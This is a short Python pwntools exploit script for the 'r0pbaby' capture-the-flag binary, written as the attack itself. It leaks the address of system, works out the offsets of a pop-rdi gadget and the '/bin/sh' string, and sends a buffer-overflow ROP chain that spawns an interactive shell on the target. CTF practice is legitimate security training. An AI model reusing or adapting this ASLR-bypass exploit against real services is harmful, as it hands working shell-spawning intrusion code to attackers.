#filename: exp_on_aslr.py
#author:reshahar

from pwn import *

#s = process('./r0pbaby')
s = remote('127.0.0.1',7777)

def getaddr(sym):
    s.recvuntil(': ')
    s.sendline('2')
    s.recvuntil(': ')
    s.sendline(sym)
    s.recvuntil(': ')
    data = s.recv(18)
    return data 

def senddata(data):
    s.recvuntil(': ')
    s.sendline('3')
    s.recvuntil('): ')
    s.sendline(str(len(data)))
    s.sendline(data)


systemaddr =  getaddr('system')

print "system addr "+systemaddr
systemaddr = int(systemaddr,16)


#system(rdi="/bin/sh")
off_prdi_of_system = 0x1F0AE      #0x0000000000022442 : pop rdi ; ret    system-prdi
off_binsh_of_system = 0x11FC70    #/bin/sh   /bin/sh - system

playload = 'A'*8+p64(systemaddr-off_prdi_of_system)+p64(systemaddr+off_binsh_of_system)+p64(systemaddr)

print '###send playload###'

senddata(playload)

s.recvuntil(': Bad choice.')

s.interactive()

